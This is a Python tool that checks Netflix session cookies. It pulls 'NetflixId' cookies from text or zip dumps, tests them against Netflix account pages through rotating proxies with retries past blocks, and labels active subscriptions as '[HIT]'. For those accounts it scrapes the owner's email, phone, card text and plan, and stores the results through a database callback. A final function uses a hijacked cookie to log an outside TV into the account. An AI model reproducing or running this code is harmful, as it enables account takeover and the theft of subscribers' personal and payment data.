import os
import json
import re
import threading
import unicodedata
import random
import zipfile
import io
from queue import Queue, Empty
from datetime import datetime
from typing import Any, Dict, List, Optional
import requests

# ==========================================
# --- EXACT PROXY SUPPORT FROM NFX_LIVE_FAST ---
# ==========================================
def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    if host.startswith("[") and host.endswith("]"): host = host[1:-1]
    if user is not None and password is not None:
        proxy_url = f"{scheme}://{user}:{password}@{host}:{port}"
    else:
        proxy_url = f"{scheme}://{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

def _parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"): return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()
    url_like = re.match(r"^(?P<scheme>https?|socks5h?|socks4a?)://(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, flags=re.IGNORECASE)
    if url_like:
        data = url_like.groupdict()
        return _build_proxy_dict(data["scheme"].lower(), data["host"], data["port"], data.get("user"), data.get("password"))
    userpass_hostport = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if userpass_hostport:
        data = userpass_hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
    hostport_userpass = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if hostport_userpass:
        data = hostport_userpass.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
    hostport = re.match(r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line)
    if hostport:
        data = hostport.groupdict()
        return _build_proxy_dict("http", data["host"], data["port"])
    four_part = line.split(":")
    if len(four_part) == 4:
        a, b, c, d = four_part
        if b.isdigit() and not d.isdigit(): return _build_proxy_dict("http", a, b, c, d)
        if d.isdigit() and not b.isdigit(): return _build_proxy_dict("http", c, d, a, b)
    split_patterns = [
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\s+(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)\|(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+);(?P<user>[^:\s]+):(?P<password>\S+)$",
        r"^(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+),(?P<user>[^:\s]+):(?P<password>\S+)$",
    ]
    for pattern in split_patterns:
        match = re.match(pattern, line)
        if match:
            data = match.groupdict()
            return _build_proxy_dict("http", data["host"], data["port"], data["user"], data["password"])
    return None

def load_proxies():
    proxy_file = "proxy.txt"
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            for line in f:
                proxy = _parse_proxy_line(line)
                if proxy: proxies.append(proxy)
    return proxies

def get_public_ip(proxies):
    local_ip = "Unknown"
    try:
        resp = requests.get("https://api.myip.com", timeout=5).json()
        local_ip = f"{resp.get('ip')} ({resp.get('country')})"
    except: local_ip = "Unable to verify (Network Error)"
    proxy_info = f"Proxies loaded: {len(proxies)}" if proxies else "No proxies used."
    if proxies:
        test_proxy = random.choice(proxies)
        try:
            p_resp = requests.get("https://api.myip.com", proxies=test_proxy, timeout=5).json()
            proxy_info += f" | Proxy Verified IP: {p_resp.get('ip')} ({p_resp.get('country')})"
        except: proxy_info += " | Proxy Verification: Failed"
    return local_ip, proxy_info

# ==========================================
# --- FLAWLESS COOKIE EXTRACTOR ---
# ==========================================
def extract_ids_from_bytes(file_bytes: bytes, filename: str) -> set:
    # BUG FIX: This regex flawlessly grabs the ENTIRE cookie without truncating it
    pattern = re.compile(r"(NetflixId=[^\s;\"']+)")
    unique_ids = set()
    filename = filename or ""
    
    if filename.endswith('.zip'):
        try:
            with zipfile.ZipFile(io.BytesIO(file_bytes), 'r') as z:
                for file_info in z.infolist():
                    if file_info.is_dir(): continue
                    with z.open(file_info) as f:
                        try: unique_ids.update(pattern.findall(f.read().decode('utf-8', errors='ignore')))
                        except: pass
        except: pass
    else:
        try: unique_ids.update(pattern.findall(file_bytes.decode('utf-8', errors='ignore')))
        except: pass
    return unique_ids

# ==========================================
# --- EXACT HELPER FUNCTIONS ---
# ==========================================
def js_hex_to_json_escapes(s: str) -> str: return re.sub(r"\\x([0-9A-Fa-f]{2})", lambda m: "\\u00" + m.group(1), s)

def extract_balanced_object(text: str, start_idx: int) -> Optional[str]:
    if start_idx < 0 or start_idx >= len(text) or text[start_idx] != "{": return None
    depth, in_str, esc, quote = 0, False, False, ""
    for i in range(start_idx, len(text)):
        ch = text[i]
        if in_str:
            if esc: esc = False
            elif ch == "\\": esc = True
            elif ch == quote: in_str = False
            continue
        if ch in ("'", '"'): in_str, quote = True, ch
        if ch == "{": depth += 1
        elif ch == "}": depth -= 1
        if depth == 0: return text[start_idx : i + 1]
    return None

def find_object_after_marker(html: str, marker: str) -> Optional[str]:
    idx = html.find(marker)
    if idx == -1: return None
    brace = html.find("{", idx)
    return extract_balanced_object(html, brace) if brace != -1 else None

def clean_to_json(s: str) -> str:
    s = js_hex_to_json_escapes(s)
    s = re.sub(r",(\s*[}\]])", r"\1", s)
    s = re.sub(r"\b(undefined|NaN|Infinity|-Infinity)\b", "null", s)
    return s

def safe_load_json(obj_str: str) -> Any:
    try: return json.loads(clean_to_json(obj_str))
    except json.JSONDecodeError: return {}

def get_path(obj: Any, path: List[Any], default=None):
    cur = obj
    for key in path:
        if isinstance(key, int):
            if not isinstance(cur, list) or key >= len(cur): return default
            cur = cur[key]
        else:
            if not isinstance(cur, dict) or key not in cur: return default
            cur = cur[key]
    return cur

def fmt_date_MMM_D_YYYY(iso: str) -> str:
    if not iso or not isinstance(iso, str): return "N/A"
    m = re.match(r"^(\d{4})-(\d{2})-(\d{2})", iso)
    if not m: return iso
    dt = datetime(int(m.group(1)), int(m.group(2)), int(m.group(3)))
    return dt.strftime("%b %d %Y").upper().replace(" 0", " ")

def bullet(label: str, value: Any) -> str:
    v = value if value not in [None, "", [], {}] else "N/A"
    return f"• {label}: {v}"

def yes_no(v: Any) -> str:
    if v is True: return "Yes"
    if v is False: return "No"
    return "N/A" if v is None else str(v)

def analyze_plan_and_language(raw_plan):
    if not raw_plan: return "Unknown", "Unknown"
    simplified = unicodedata.normalize("NFKD", raw_plan)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_") or "unknown"
    
    plan_data = {
        "premium": ("Premium", "English"), "standard_with_ads": ("Standard With Ads", "English"),
        "standard": ("Standard", "English"), "basic": ("Basic", "English"), "mobile": ("Mobile", "English"),
        "cao_cap": ("Premium", "Vietnamese"), "caocap": ("Premium", "Vietnamese"), 
        "tieuchuan": ("Standard", "Vietnamese"), "tieu_chuan": ("Standard", "Vietnamese"), 
        "co_ban": ("Basic", "Vietnamese"),
        "estandar": ("Standard", "Spanish"), "basico": ("Basic", "Spanish"), "basico_con_anuncios": ("Basic With Ads", "Spanish"),
        "padrao_com_anuncios": ("Standard With Ads", "Portuguese"), "padrao": ("Standard", "Portuguese"),
        "standard_avec_pub": ("Standard With Ads", "French"), "basique": ("Basic", "French"), "essentiel": ("Basic", "French"),
        "standardowy_z_reklamami": ("Standard With Ads", "Polish"), "standardowy": ("Standard", "Polish"), "podstawowy": ("Basic", "Polish"),
        "ozel": ("Premium", "Turkish"), "standart": ("Standard", "Turkish"), "temel": ("Basic", "Turkish"),
        "พรีเมียม": ("Premium", "Thai"), "มาตรฐาน": ("Standard", "Thai"), "พื้นฐาน": ("Basic", "Thai"),
        "المميزة": ("Premium", "Arabic"), "القياسية": ("Standard", "Arabic"), "الاساسية": ("Basic", "Arabic"),
        "dasar": ("Basic", "Indonesian"), "ponsel": ("Mobile", "Indonesian"),
        "base": ("Basic", "Italian/Generic"), "basis": ("Basic", "Dutch/Generic")
    }
    for key, data in plan_data.items():
        if normalized == key or key in normalized: return data[0], data[1]
    return raw_plan.title(), f"Original: {raw_plan}"

# ==========================================
# --- EXACT EXTRACTION LOGIC ---
# ==========================================
def perform_extraction(html: str, original_id: str, processed_guids: set, guid_lock: threading.Lock):
    gql_obj = find_object_after_marker(html, '"graphql":')
    rc_obj = find_object_after_marker(html, "netflix.reactContext")
    
    if not gql_obj: 
        return "ERROR", "Unknown", "Unknown", False, False, {}

    gql_root = safe_load_json("{" + '"graphql":' + gql_obj + "}")
    rc_root = safe_load_json(rc_obj) if rc_obj else {}

    data = get_path(gql_root, ["graphql", "data"], {})
    root = data.get("ROOT_QUERY", {})
    growth_key = next((k for k in root.keys() if "growthAccount" in k), None)
    growth = root.get(growth_key) if growth_key else {}
    profile_ref = get_path(root, ["currentProfile", "__ref"])
    curr_prof = data.get(profile_ref, {})
    fields = get_path(rc_root, ["models", "signupContext", "data", "flow", "fields"], {})
    plan_f = fields.get("currentPlan", {}).get("fields", {})

    email_value = (get_path(curr_prof, ["growthEmail", "email", "value"]) or "").strip().lower()
    user_guid = growth.get("ownerGuid") or curr_prof.get("guid") or "Unknown"
    
    duplicate_key = email_value if email_value else user_guid
    with guid_lock:
        if duplicate_key != "Unknown" and duplicate_key in processed_guids:
            return "DUPLICATE", None, None, False, False, {}
        if duplicate_key != "Unknown":
            processed_guids.add(duplicate_key)

    raw_plan_name = plan_f.get("localizedPlanName", {}).get("value") or get_path(growth, ["currentPlan", "plan", "name"]) or ""
    canonical_plan, display_lang = analyze_plan_and_language(raw_plan_name)
    quality = plan_f.get("videoQuality", {}).get("value") or "Unknown"

    membership_status = growth.get("membershipStatus")
    is_subscribed = (membership_status == "CURRENT_MEMBER")
    is_on_hold = (growth.get("growthHoldMetadata", {}).get("isUserOnHold") is True)

    payment_methods = growth.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = payment_method.get("paymentOptionLogo", {}).get("paymentOptionLogo") if isinstance(payment_method.get("paymentOptionLogo"), dict) else payment_method.get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename", ""))
    payment_display_text = payment_method.get("displayText")

    payment_type = payment_logo or growth.get("payer")
    masked_card = None

    if "Card" in payment_typename:
        payment_type = "CC"
        if payment_display_text: masked_card = payment_display_text
    elif payment_display_text and not payment_logo:
        payment_type = payment_type or payment_display_text

    status_label = "[HIT]" if is_subscribed else ("[FREE]" if not is_on_hold else "[ON HOLD]")
    
    out = []
    out.append(f"\n--- {status_label} ACCOUNT DETAILS ---")
    out.append(f"• Target ID: {original_id[:30]}...")
    out.append(bullet("Name", curr_prof.get("name")))
    out.append(bullet("Email", email_value if email_value else "Unknown"))
    out.append(bullet("Country", get_path(growth, ["countryOfSignUp", "code"])))
    out.append(bullet("Plan", canonical_plan))
    out.append(bullet("Display Language", display_lang))
    out.append(bullet("Price", plan_f.get("planPrice", {}).get("value")))
    out.append(bullet("Member Since", fmt_date_MMM_D_YYYY(growth.get("memberSince"))))
    out.append(bullet("Next Billing", fmt_date_MMM_D_YYYY(get_path(growth, ["nextBillingDate", "date"]))))
    out.append(bullet("Payment", payment_type))
    if masked_card: out.append(bullet("Card", masked_card))
    out.append(bullet("Phone", get_path(growth, ["growthLocalizablePhoneNumber", "rawPhoneNumber", "phoneNumberDigits", "value"])))
    out.append(bullet("Quality", quality))
    out.append(bullet("Screen", plan_f.get("maxStreams", {}).get("value")))
    out.append(bullet("Hold Status", yes_no(is_on_hold)))
    out.append(bullet("Membership Status", membership_status))
    
    p_parts = []
    for p in growth.get("profiles", []):
        prof = data.get(p.get("__ref"), {})
        p_parts.append(f"{prof.get('name')} ({'Kids' if prof.get('isKids') else 'Adult'})")
    out.append(bullet("Connected Profiles", len(p_parts)))
    out.append(bullet("Profiles", ", ".join(p_parts)))
    out.append("---------------------------------\n")
    
    # Store the exact CLI text natively in the API JSON response
    db_data = {
        "netflix_id": f"NetflixId={original_id}",
        "email": email_value,
        "plan": canonical_plan,
        "quality": quality,
        "language": display_lang,
        "status": status_label.replace("[", "").replace("]", ""),
        "cli_text": "\n".join(out)
    }
    
    return "\n".join(out), canonical_plan, quality, is_subscribed, is_on_hold, db_data

# ==========================================
# --- EXACT THREAD WORKER WITH API HOOK ---
# ==========================================
def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: list, processed_guids: set, guid_lock: threading.Lock, db_callback=None):
    max_retries = 3 
    retryable_status_codes = {403, 429, 500, 502, 503, 504}

    while True:
        try: netflix_id = q.get_nowait()
        except Empty: break
            
        clean_id = netflix_id.replace("NetflixId=", "").strip()
        if not clean_id:
            q.task_done()
            continue

        success = False
        last_error = None

        for attempt in range(max_retries):
            proxy = random.choice(proxies) if proxies else None

            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                })
                
                session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
                response = session.get('https://www.netflix.com/YourAccount', allow_redirects=True, proxies=proxy, timeout=15)
                
                if response.status_code in retryable_status_codes:
                    last_error = f"HTTP {response.status_code} (Rate Limited/Blocked)"
                    continue 

                if "login" in response.url.lower():
                    with print_lock:
                        print(f"[DEAD] {clean_id[:20]}... -> Redirected to login")
                        stats["dead"] += 1
                elif '"graphql":' in response.text:
                    result_text, plan_name, quality, is_subscribed, is_on_hold, db_data = perform_extraction(
                        response.text, clean_id, processed_guids, guid_lock
                    )
                    
                    with print_lock:
                        if result_text == "DUPLICATE":
                            print(f"[DUPLICATE] {clean_id[:20]}... -> Already checked")
                            stats["duplicates"] += 1
                        elif result_text == "ERROR":
                            print(f"[ERROR] {clean_id[:20]}... -> Missing GraphQL Data")
                            stats["errors"] += 1
                        else:
                            print(result_text)
                            if is_on_hold: stats["holds"] += 1
                            if is_subscribed:
                                stats["hits"] += 1
                                stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
                                stats["plans"][plan_name] = stats["plans"].get(plan_name, 0) + 1
                                
                                # --- ONLY SAVE VALID GOOD HITS TO DB ---
                                if not is_on_hold and db_callback:
                                    db_callback(db_data)
                            else:
                                stats["free"] += 1
                else:
                    with print_lock:
                        print(f"[UNKNOWN] {clean_id[:20]}... -> Page loaded but missing graphql data.")
                        stats["unknown"] += 1
                
                success = True
                break 

            except requests.exceptions.ProxyError:
                last_error = "ProxyError (Blocked by Target)"
                continue 
            except requests.RequestException as e:
                last_error = f"{type(e).__name__}"
                continue 

        if not success:
            with print_lock:
                print(f"[ERROR] Connection failed for {clean_id[:20]}... after {max_retries} attempts -> {last_error}")
                stats["errors"] += 1

        q.task_done()

# ==========================================
# --- DYNAMIC TV AUTOMATION (WITH REFRESH) ---
# ==========================================
def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tuple:
    clean_id = netflix_id.replace("NetflixId=", "").strip()
    session = requests.Session()
    
    session.headers.update({
        'authority': 'www.netflix.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.netflix.com',
        'referer': 'https://www.netflix.com/tv2',
        'sec-ch-ua': '"Chromium";v="137"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    })
    
    session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
    proxy = random.choice(proxies) if proxies else None

    try:
        # 1. This GET request forces Netflix to refresh the session cookies
        session.get("https://www.netflix.com/", proxies=proxy, timeout=15)
        
        # Extract the newly refreshed NetflixId provided by the server
        refreshed_id = session.cookies.get("NetflixId") or clean_id
        refreshed_cookie_string = f"NetflixId={refreshed_id}"

        res_tv8 = session.get("https://www.netflix.com/tv8", proxies=proxy, timeout=15)
        rc_obj = find_object_after_marker(res_tv8.text, "netflix.reactContext")
        rc_root = safe_load_json(rc_obj) if rc_obj else {}
        
        auth_url = get_path(rc_root, ["models", "signupContext", "data", "flow", "authURL"])
        
        if not auth_url: 
            return False, "Failed to extract dynamic authURL. Cookie might be dead.", refreshed_cookie_string

        payload = {
            'flow': 'websiteSignUp', 'authURL': auth_url,
            'flowMode': 'enterTvLoginRendezvousCode', 'withFields': 'tvLoginRendezvousCode,isTvUrl2',
            'code': tv_code, 'tvLoginRendezvousCode': tv_code, 'isTvUrl2': 'true', 'action': 'nextAction'
        }
        res_tv2 = session.post("https://www.netflix.com/tv2", data=payload, proxies=proxy, timeout=15)
        
        # --- STRICT URL SUCCESS CHECK ---
        if "tv/out/success" in res_tv2.url.lower(): 
            return True, "Login successful!", refreshed_cookie_string
            
        return False, f"Failed. Final URL was: {res_tv2.url}", refreshed_cookie_string
    except Exception as e:
        return False, f"Network Error: {str(e)}", netflix_id

